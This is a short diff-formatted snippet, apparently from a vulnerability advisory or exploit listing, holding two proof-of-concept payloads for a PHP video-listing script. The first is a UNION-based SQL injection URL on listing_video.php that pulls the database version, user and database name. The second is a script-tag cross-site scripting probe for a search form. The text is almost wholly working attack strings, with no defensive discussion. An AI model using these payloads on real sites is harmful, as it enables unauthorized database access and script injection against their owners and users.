@@ -1,0 +1,6 @@
+For the SQL-injection issue:
+http://www.example.com/listing_video.php?catid=2+UNION%20SELECT%201,2,3,4,CHAR(83,%20110,%2097,%20107,%20101,%20115,%2084,%20101,%2097,%2077),6,7,8,9,10,11,concat(@@version,0x3a,user(),0x3a,database()),13,14,15,16,17,18--
+
+For the cross-site-scripting issue:
+(XSS)&lt;----Search form----&gt;
+&lt;script&gt;alert(1954)&lt;/script&gt;
